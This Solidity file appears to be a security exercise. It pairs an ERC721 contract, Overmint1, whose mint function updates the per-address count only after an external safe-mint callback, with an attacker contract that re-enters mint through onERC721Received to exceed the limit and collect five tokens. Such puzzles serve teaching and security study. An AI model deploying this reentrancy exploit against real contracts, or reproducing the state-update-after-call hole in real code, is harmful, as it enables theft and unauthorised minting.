// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/interfaces/IERC721Receiver.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";

contract Overmint1 is ERC721 {
    using Address for address;
    mapping(address => uint256) public amountMinted;
    uint256 public totalSupply;

    constructor() ERC721("Overmint1", "AT") {}

    function mint() external {
        require(amountMinted[msg.sender] <= 3, "max 3 NFTs");
        totalSupply++;
        _safeMint(msg.sender, totalSupply);
        amountMinted[msg.sender]++;
    }

    function success(address _attacker) external view returns (bool) {
        return balanceOf(_attacker) == 5;
    }
}
contract Overmint1Attacker is IERC721Receiver {
    Overmint1 public vulnerableContract;

    constructor(address vulnerableContract_) {
        vulnerableContract = Overmint1(vulnerableContract_);
    }
    function attack() external {
        vulnerableContract.mint();
        for (uint256 i = 1; i < 6; i++) {
            vulnerableContract.transferFrom(address(this), msg.sender, i);
        }
    }

    function onERC721Received(address, address, uint256, bytes calldata) external override returns (bytes4) {
        if (vulnerableContract.totalSupply() < 5) {
            vulnerableContract.mint();
        }
        return this.onERC721Received.selector;
    }
}
